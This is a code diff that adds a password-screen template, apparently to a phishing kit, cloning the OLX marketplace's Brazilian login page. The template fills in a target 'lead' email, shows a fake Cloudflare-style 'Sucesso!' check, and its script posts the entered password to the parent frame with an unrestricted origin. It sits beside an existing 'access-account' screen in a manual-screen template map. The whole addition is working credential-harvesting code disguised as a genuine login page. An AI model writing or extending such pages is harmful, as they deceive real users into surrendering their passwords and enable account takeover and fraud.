@@ -113,9 +113,146 @@ const ACCESS_ACCOUNT_HTML = `<!DOCTYPE html>
 </body>
 </html>`;
 
+const PASSWORD_SCREEN_HTML = `<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Acesse a sua conta - OLX</title>
+<style>
+  *,*::before,*::after{box-sizing:border-box}
+  html,body{margin:0;padding:0;background:#fff;color:#1a1a1a;font-family:-apple-system,BlinkMacSystemFont,'Open Sans','Segoe UI',Roboto,Helvetica,Arial,sans-serif;-webkit-font-smoothing:antialiased}
+  .topbar{padding:18px 20px;border-bottom:1px solid #e8e8e8}
+  .logo{display:inline-block}
+  .logo svg{display:block;height:36px;width:auto}
+  main{max-width:480px;margin:0 auto;padding:48px 24px 32px}
+  h1{font-size:26px;font-weight:600;text-align:center;margin:0 0 28px;letter-spacing:-.2px}
+  .email-pill{display:block;width:100%;padding:14px 20px;border:1px solid #d0d0d0;border-radius:9999px;text-align:center;font-size:15px;color:#1a1a1a;background:#fff;margin:0 0 28px}
+  .field-group{margin:0 0 20px}
+  .field-label{display:block;font-size:16px;font-weight:600;color:#1a1a1a;margin:0 0 8px}
+  .input-wrap{position:relative;display:flex;align-items:center}
+  .input-wrap input{width:100%;padding:16px 48px 16px 16px;border:1px solid #d0d0d0;border-radius:12px;font:inherit;font-size:16px;color:#1a1a1a;background:#fff;outline:none;transition:border-color .15s}
+  .input-wrap input:focus{border-color:#6E0AD6}
+  .toggle-pw{position:absolute;right:14px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;padding:4px;color:#6E0AD6;display:flex;align-items:center;justify-content:center}
+  .cf-box{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:10px 14px;border:1px solid #e5e7eb;border-radius:6px;background:#fafafa;font-size:14px;color:#1a1a1a;max-width:303px;width:100%;margin:0 0 24px;min-height:65px}
+  .cf-left{display:flex;align-items:center;gap:10px;flex:1;min-width:0}
+  .cf-right{display:flex;flex-direction:column;align-items:center;gap:2px;flex-shrink:0}
+  .cf-right span{font-size:9px;color:#999;line-height:1}
+  .btn-entrar{display:block;width:100%;padding:18px;border:0;border-radius:9999px;background:#f48120;color:#fff;font:inherit;font-size:18px;font-weight:700;text-align:center;cursor:pointer;transition:opacity .15s}
+  .btn-entrar:hover{opacity:.9}
+  .links{display:flex;justify-content:space-between;align-items:center;margin:20px 0 0;padding:0}
+  .links a,.links button{background:none;border:0;color:#6E0AD6;font:inherit;font-size:16px;font-weight:600;cursor:pointer;text-decoration:none;padding:0}
+  .links a:hover,.links button:hover{text-decoration:underline}
+  @keyframes olxSpin{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+  <header class="topbar">
+    <div class="logo" aria-label="OLX">
+      <svg viewBox="0 0 80 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+        <text x="0" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#6E0AD6">o</text>
+        <text x="22" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#7DD800">L</text>
+        <text x="40" y="26" font-family="Arial Black, Arial, sans-serif" font-size="30" font-weight="900" fill="#FF8A00">x</text>
+      </svg>
+    </div>
+  </header>
+
+  <main>
+    <h1>Acesse a sua conta</h1>
+    <div class="email-pill" id="user-email">{{lead.email}}</div>
+
+    <div class="field-group">
+      <label class="field-label" for="pw-input">Senha</label>
+      <div class="input-wrap">
+        <input id="pw-input" type="password" name="password" autocomplete="current-password" placeholder="" aria-label="Senha">
+        <button type="button" class="toggle-pw" aria-label="Mostrar senha" id="toggle-pw-btn">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M2 12s3.6-7 10-7 10 7 10 7-3.6 7-10 7S2 12 2 12z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+            <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="1.5"/>
+            <line x1="4" y1="20" x2="20" y2="4" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" id="pw-slash"/>
+          </svg>
+        </button>
+      </div>
+    </div>
+
+    <div class="cf-box">
+      <div class="cf-left">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16a34a"/><polyline points="7 12.5 10.5 16 17 9" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span>Sucesso!</span>
+      </div>
+      <div class="cf-right">
+        <svg width="34" height="14" viewBox="0 0 88 36" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#f48120" d="M55.7 26.3l.5-1.7c.6-2 .4-3.9-.6-5.2-.9-1.3-2.4-2-4.2-2.1l-34.4-.4c-.2 0-.4-.1-.5-.3-.1-.2-.1-.4-.1-.6.1-.3.4-.5.7-.5l34.7-.4c4.1-.2 8.6-3.5 10.2-7.6l2-5.2c.1-.2.1-.4.1-.6C61.7 1 55.5 0 49.3 0 33.7 0 20.6 10 16.6 24c-2.6-.2-4.7 2.5-4.3 5 .4 2.1 2.2 3.7 4.4 4 .3 0 .6 0 .9-.1l34.4-.4c2.5-.1 4.7-1.7 5.7-4l-2-2.2z"/>
+          <path fill="#faae40" d="M67.3 9.7c-.3 0-.6 0-.9.1-.2 0-.4.2-.5.4l-1.4 4.7c-.6 2-.4 3.9.6 5.2.9 1.3 2.4 2 4.2 2.1l7.3.4c.2 0 .4.1.5.3.1.2.1.4.1.6-.1.3-.4.5-.7.5l-7.6.4c-4.1.2-8.6 3.5-10.2 7.6l-.6 1.5c-.1.3.1.6.4.6h26.1c.3 0 .6-.2.7-.5 1.1-3.6 1.7-7.4 1.7-11.4 0-6.3-1.4-12.3-3.9-17.6-.1-.2-.4-.3-.6-.3-.6.1-1.2.2-1.8.4-4.4 1.3-8.5 3.5-12.1 6.5"/>
+        </svg>
+        <span>Privacidade · Ajuda</span>
+      </div>
+    </div>
+
+    <button type="button" class="btn-entrar" id="btn-entrar">Entrar</button>
+
+    <div class="links">
+      <button type="button" class="back-btn" data-action="back">Voltar</button>
+      <a href="#" data-action="forgot-password">Esqueceu sua senha?</a>
+    </div>
+  </main>
+
+  <script>
+    (function(){
+      var pwInput = document.getElementById('pw-input');
+      var toggleBtn = document.getElementById('toggle-pw-btn');
+      var slash = document.getElementById('pw-slash');
+      if(toggleBtn && pwInput){
+        toggleBtn.addEventListener('click', function(){
+          var showing = pwInput.type === 'text';
+          pwInput.type = showing ? 'password' : 'text';
+          if(slash) slash.style.display = showing ? '' : 'none';
+        });
+      }
+
+      var entrarBtn = document.getElementById('btn-entrar');
+      if(entrarBtn && pwInput){
+        entrarBtn.addEventListener('click', function(){
+          var pw = (pwInput.value || '').trim();
+          if(!pw){
+            pwInput.style.borderColor = '#e53e3e';
+            pwInput.focus();
+            return;
+          }
+          window.parent.postMessage({
+            type: 'iframe-help-action',
+            action: 'password-submit',
+            password: pw
+          }, '*');
+        });
+      }
+
+      var backBtn = document.querySelector('[data-action="back"]');
+      if(backBtn){
+        backBtn.addEventListener('click', function(){
+          window.parent.postMessage({ type: 'iframe-link-click', url: 'back' }, '*');
+        });
+      }
+
+      var forgotBtn = document.querySelector('[data-action="forgot-password"]');
+      if(forgotBtn){
+        forgotBtn.addEventListener('click', function(e){
+          e.preventDefault();
+          window.parent.postMessage({ type: 'iframe-help-action', action: 'forgot-password' }, '*');
+        });
+      }
+    })();
+  </script>
+</body>
+</html>`;
+
 export const MANUAL_SCREEN_TEMPLATES: Record<string, { title: string; html: string }> = {
   "access-account": {
     title: "Acesse sua conta",
     html: ACCESS_ACCOUNT_HTML,
+  },
+  "password": {
+    title: "Tela de senha",
+    html: PASSWORD_SCREEN_HTML,
   },
 };
